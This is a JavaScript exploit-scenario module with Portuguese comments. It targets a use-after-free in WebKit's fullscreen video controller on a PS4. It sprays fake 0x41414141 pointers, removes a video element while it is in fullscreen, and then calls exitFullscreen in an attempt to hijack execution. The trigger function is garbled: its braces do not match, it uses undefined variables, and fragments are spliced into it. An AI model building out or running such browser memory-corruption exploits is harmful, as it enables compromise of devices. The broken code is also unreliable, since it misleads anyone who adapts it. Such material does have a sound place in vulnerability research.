/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Fase de Exploração / Control)
 * Alvo: FullscreenVideoController::exitFullscreen()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description: 'Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141) para controlar a execução (PC/RIP hijack).',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.container.appendChild(this.video);

        // Preparamos a nossa munição de Spray (Uint32Array com ponteiros falsos)
        // 0x41414141 = "AAAA" (Padrão clássico para ver se controlamos a memória)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
            await new Promise(r => setTimeout(r, 100));

            // 1. FREE: Apagamos o vídeo
            this.video.remove();

            


    // 3. O ATAQUE DIRETO: Forçamos a função de saída PRÓPRIA do player apos isso o crash ocorre com o setTimeout(() => location.reload(), 500)
    if (videoAlvo && videoAlvo.webkitExitFullscreen) {
        videoAlvo.webkitExitFullscreen();
    } else if (videoAlvo && videoAlvo.webkitExitFullScreen) {
        videoAlvo.webkitExitFullScreen();
    }

    
} catch(e) {
    log("[ERRO] " + e);
}
            //4. Aqui que acontece a mágica! quando a página esta saindo do modo Fullscreen o crash ocorre o valor 500 não pode ser alterado!
            setTimeout(() => location.reload(), 500);
        };
            // 3. USE: Disparamos o controlador. 
            // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
            // a PS4 vai dar crash imediato (CE-34878-0) tentando executar a morada 0x41414141!
            if (document.webkitExitFullscreen) document.webkitExitFullscreen();
        } catch(e) {}
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
